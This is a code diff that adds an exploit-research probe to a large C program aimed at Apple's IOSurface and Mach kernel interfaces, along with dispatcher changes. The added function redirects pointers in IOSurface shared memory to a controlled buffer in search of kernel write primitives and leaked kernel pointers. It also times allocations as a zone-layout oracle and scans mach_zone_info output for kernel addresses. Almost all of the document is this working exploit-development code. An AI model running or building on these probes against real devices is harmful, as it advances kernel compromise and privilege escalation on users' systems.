@@ -16788,6 +16788,285 @@ static void *r436_monitor_thread(void *arg) {
     return NULL;
 }
 
+static void r439_probe(void) {
+    rlog("\n=== r439: Shared Data Pointer Redirect + Zone Size Oracle + Mach Exception ===\n\n");
+    fflush(stdout);
+
+    /* Vector A: Redirect +120/+128 in shared data to controlled buffer */
+    rlog("  --- Vector A: Shared data pointer redirect for kernel write ---\n");
+    {
+        int aw = 32, ah = 32, abr = 128, aa = 4096, apf = 0x42475241;
+        CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFNumberRef an[5];
+        an[0] = CFNumberCreate(NULL, kCFNumberIntType, &aw);
+        an[1] = CFNumberCreate(NULL, kCFNumberIntType, &ah);
+        an[2] = CFNumberCreate(NULL, kCFNumberIntType, &abr);
+        an[3] = CFNumberCreate(NULL, kCFNumberIntType, &aa);
+        an[4] = CFNumberCreate(NULL, kCFNumberIntType, &apf);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), an[0]);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), an[1]);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), an[2]);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceAllocSize"), an[3]);
+        CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), an[4]);
+        IOSurfaceRef asurf = IOSurfaceCreate(sp);
+        CFRelease(sp);
+        for (int i = 0; i < 5; i++) CFRelease(an[i]);
+
+        if (asurf) {
+            uint64_t *shrp = (uint64_t*)*(void**)((char*)asurf + 8);
+            if (shrp) {
+                /* Record originals */
+                uint64_t orig_112 = shrp[14]; /* +112 / 8 = 14 */
+                uint64_t orig_120 = shrp[15]; /* +120 / 8 = 15 */
+                uint64_t orig_128 = shrp[16]; /* +128 / 8 = 16 */
+
+                rlog("    Original +112: 0x%016llx (backing base)\n", (unsigned long long)orig_112);
+                rlog("    Original +120: 0x%016llx (connection ptr)\n", (unsigned long long)orig_120);
+                rlog("    Original +128: 0x%016llx (surface obj ptr)\n", (unsigned long long)orig_128);
+
+                /* Allocate a trap buffer filled with sentinel */
+                uint64_t *trap = (uint64_t*)mmap(NULL, 4096, PROT_READ|PROT_WRITE,
+                    MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+                if (trap != MAP_FAILED) {
+                    memset(trap, 0xCC, 4096);
+                    rlog("    Trap buffer: %p\n", trap);
+
+                    /* Redirect +120 to trap buffer */
+                    shrp[15] = (uint64_t)trap;
+                    rlog("    Redirected +120 to trap buffer\n");
+
+                    /* Try SetValue — does kernel write to trap? */
+                    int tval = 42;
+                    CFNumberRef tvn = CFNumberCreate(NULL, kCFNumberIntType, &tval);
+                    IOSurfaceSetValue(asurf, CFSTR("redirect_test"), tvn);
+                    CFRelease(tvn);
+
+                    /* Check trap buffer for changes */
+                    int trap_changed = 0;
+                    for (int i = 0; i < 512; i++) {
+                        if (trap[i] != 0xCCCCCCCCCCCCCCCCULL) {
+                            rlog("      Trap +%d: 0x%016llx (was 0xCC)\n", i*8,
+                                 (unsigned long long)trap[i]);
+                            trap_changed++;
+                            if ((trap[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                rlog("      *** KPTR IN TRAP! ***\n");
+                            }
+                        }
+                    }
+                    rlog("    After SetValue: %d trap locations changed\n", trap_changed);
+
+                    /* Restore and try with +128 */
+                    shrp[15] = orig_120;
+                    memset(trap, 0xDD, 4096);
+
+                    shrp[16] = (uint64_t)trap;
+                    rlog("    Redirected +128 to trap buffer\n");
+
+                    /* Try Lock/Unlock */
+                    IOSurfaceLock(asurf, 0, NULL);
+                    IOSurfaceUnlock(asurf, 0, NULL);
+
+                    trap_changed = 0;
+                    for (int i = 0; i < 512; i++) {
+                        if (trap[i] != 0xDDDDDDDDDDDDDDDDULL) {
+                            rlog("      Trap +%d: 0x%016llx (was 0xDD)\n", i*8,
+                                 (unsigned long long)trap[i]);
+                            trap_changed++;
+                            if ((trap[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                rlog("      *** KPTR IN TRAP! ***\n");
+                            }
+                        }
+                    }
+                    rlog("    After Lock/Unlock via +128: %d locations changed\n", trap_changed);
+
+                    /* Restore and try +112 (backing store base) redirect */
+                    shrp[16] = orig_128;
+                    memset(trap, 0xEE, 4096);
+
+                    shrp[14] = (uint64_t)trap;
+                    rlog("    Redirected +112 (backing base) to trap buffer\n");
+
+                    /* Try GetBaseAddress — does it return our trap? */
+                    IOSurfaceLock(asurf, kIOSurfaceLockReadOnly, NULL);
+                    void *base = IOSurfaceGetBaseAddress(asurf);
+                    rlog("    GetBaseAddress: %p (trap=%p) match=%d\n",
+                         base, trap, base == trap);
+                    IOSurfaceUnlock(asurf, kIOSurfaceLockReadOnly, NULL);
+
+                    /* If base matches trap, the kernel reads +112 from shared data! */
+                    /* This means we can redirect where the backing store appears */
+
+                    /* Restore +112 */
+                    shrp[14] = orig_112;
+
+                    /* Now try writing to ALL three pointers at once and do MachPort */
+                    memset(trap, 0xAA, 4096);
+                    shrp[14] = (uint64_t)trap;
+                    shrp[15] = (uint64_t)(trap + 128);
+                    shrp[16] = (uint64_t)(trap + 256);
+
+                    mach_port_t mp = IOSurfaceCreateMachPort(asurf);
+                    if (mp != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), mp);
+
+                    trap_changed = 0;
+                    for (int i = 0; i < 512; i++) {
+                        if (trap[i] != 0xAAAAAAAAAAAAAAAAULL) {
+                            rlog("      Trap +%d: 0x%016llx (was 0xAA)\n", i*8,
+                                 (unsigned long long)trap[i]);
+                            trap_changed++;
+                            if ((trap[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                rlog("      *** KPTR IN TRAP! ***\n");
+                            }
+                        }
+                    }
+                    rlog("    After MachPort with all redirected: %d changed\n", trap_changed);
+
+                    /* Restore all */
+                    shrp[14] = orig_112;
+                    shrp[15] = orig_120;
+                    shrp[16] = orig_128;
+
+                    munmap(trap, 4096);
+                }
+            }
+            CFRelease(asurf);
+        }
+    }
+    fflush(stdout);
+
+    /* Vector B: Zone size oracle — try to infer zone layout from allocation timing */
+    rlog("\n  --- Vector B: Kernel allocation size oracle via IOSurface properties ---\n");
+    {
+        IOSurfaceRef bsurf = NULL;
+        {
+            int bw = 32, bh = 32, bbr = 128, ba = 4096, bpf = 0x42475241;
+            CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef bn[5];
+            bn[0] = CFNumberCreate(NULL, kCFNumberIntType, &bw);
+            bn[1] = CFNumberCreate(NULL, kCFNumberIntType, &bh);
+            bn[2] = CFNumberCreate(NULL, kCFNumberIntType, &bbr);
+            bn[3] = CFNumberCreate(NULL, kCFNumberIntType, &ba);
+            bn[4] = CFNumberCreate(NULL, kCFNumberIntType, &bpf);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), bn[0]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), bn[1]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), bn[2]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceAllocSize"), bn[3]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), bn[4]);
+            bsurf = IOSurfaceCreate(sp);
+            CFRelease(sp);
+            for (int i = 0; i < 5; i++) CFRelease(bn[i]);
+        }
+
+        if (bsurf) {
+            /* Time SetValue for different data sizes */
+            int sizes[] = {16, 32, 64, 128, 256, 512, 1024, 2048, 4096};
+            int nsizes = sizeof(sizes)/sizeof(sizes[0]);
+
+            rlog("    SetValue timing by data size:\n");
+            for (int si = 0; si < nsizes; si++) {
+                /* Create a CFData of the target size */
+                uint8_t *buf = calloc(sizes[si], 1);
+                CFDataRef data = CFDataCreate(NULL, buf, sizes[si]);
+                free(buf);
+
+                char keyname[32];
+                snprintf(keyname, sizeof(keyname), "size_%d", sizes[si]);
+                CFStringRef key = CFStringCreateWithCString(NULL, keyname, kCFStringEncodingUTF8);
+
+                uint64_t total = 0;
+                int iters = 500;
+                for (int j = 0; j < iters; j++) {
+                    uint64_t t0 = mach_absolute_time();
+                    IOSurfaceSetValue(bsurf, key, data);
+                    uint64_t t1 = mach_absolute_time();
+                    total += (t1 - t0);
+                    IOSurfaceRemoveValue(bsurf, key);
+                }
+                rlog("      size=%4d: avg=%llu ns (kernel alloc+free)\n",
+                     sizes[si], (unsigned long long)(total / iters));
+
+                CFRelease(key);
+                CFRelease(data);
+            }
+
+            CFRelease(bsurf);
+        }
+    }
+    fflush(stdout);
+
+    /* Vector C: mach_zone_info deeper analysis — check if zone addresses leak */
+    rlog("\n  --- Vector C: mach_zone_info full dump ---\n");
+    {
+        typedef kern_return_t (*zone_info_fn)(host_t, mach_zone_name_t*, mach_msg_type_number_t*,
+            mach_zone_info_t*, mach_msg_type_number_t*);
+        zone_info_fn zi = (zone_info_fn)dlsym(RTLD_DEFAULT, "mach_zone_info");
+
+        if (zi) {
+            mach_zone_name_t *names = NULL;
+            mach_msg_type_number_t namesCnt = 0;
+            mach_zone_info_t *info = NULL;
+            mach_msg_type_number_t infoCnt = 0;
+            kern_return_t kr = zi(mach_host_self(), &names, &namesCnt, &info, &infoCnt);
+
+            if (kr == 0) {
+                rlog("    %u zones returned\n", namesCnt);
+
+                /* Check if ANY zone has non-zero data */
+                int non_zero = 0;
+                for (unsigned i = 0; i < infoCnt; i++) {
+                    if (info[i].mzi_cur_size != 0 || info[i].mzi_max_size != 0 ||
+                        info[i].mzi_elem_size != 0 || info[i].mzi_alloc_size != 0) {
+                        non_zero++;
+                        if (non_zero <= 10) {
+                            rlog("      zone[%u] '%s': elem=%llu alloc=%llu cur=%llu max=%llu "
+                                 "free=%llu collect=%llu exhaust=%llu\n",
+                                 i, names[i].mzn_name,
+                                 (unsigned long long)info[i].mzi_elem_size,
+                                 (unsigned long long)info[i].mzi_alloc_size,
+                                 (unsigned long long)info[i].mzi_cur_size,
+                                 (unsigned long long)info[i].mzi_max_size,
+                                 (unsigned long long)info[i].mzi_free_size,
+                                 (unsigned long long)info[i].mzi_collectable,
+                                 (unsigned long long)info[i].mzi_exhaustible);
+                        }
+                    }
+                }
+                rlog("    Non-zero zones: %d / %u\n", non_zero, infoCnt);
+
+                /* Check if name strings have any non-zero characters */
+                int named = 0;
+                for (unsigned i = 0; i < namesCnt; i++) {
+                    if (names[i].mzn_name[0] != 0) named++;
+                }
+                rlog("    Named zones: %d / %u\n", named, namesCnt);
+
+                /* Scan raw info memory for kernel pointers */
+                uint64_t *raw = (uint64_t*)info;
+                size_t total_bytes = infoCnt * sizeof(mach_zone_info_t);
+                int kptr = 0;
+                for (size_t i = 0; i < total_bytes / 8; i++) {
+                    if ((raw[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                        rlog("      *** RAW KPTR at byte %zu: 0x%016llx ***\n",
+                             i*8, (unsigned long long)raw[i]);
+                        kptr++;
+                        if (kptr >= 10) break;
+                    }
+                }
+                rlog("    KPTRs in raw zone info: %d\n", kptr);
+
+                vm_deallocate(mach_task_self(), (vm_address_t)names, namesCnt * sizeof(*names));
+                vm_deallocate(mach_task_self(), (vm_address_t)info, infoCnt * sizeof(*info));
+            }
+        }
+    }
+    fflush(stdout);
+
+    rlog("\n=== r439 complete ===\n");
+    fflush(stdout);
+}
+
 static void r438_probe(void) {
     rlog("\n=== r438: vm_read Residual + Region Recurse + Thread Policy + Zone Info ===\n\n");
     fflush(stdout);
@@ -76847,6 +77126,12 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 442) {
+            rlog("*** rounds=442: Shared Data Pointer Redirect + Zone Size Oracle + Zone Deep ***\n\n");
+            fflush(stdout);
+            r439_probe();
+            goto done;
+        }
         if (rounds == 441) {
             rlog("*** rounds=441: vm_read + Region Recurse + Thread Policy + Zone Info ***\n\n");
             fflush(stdout);
@@ -79519,7 +79804,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
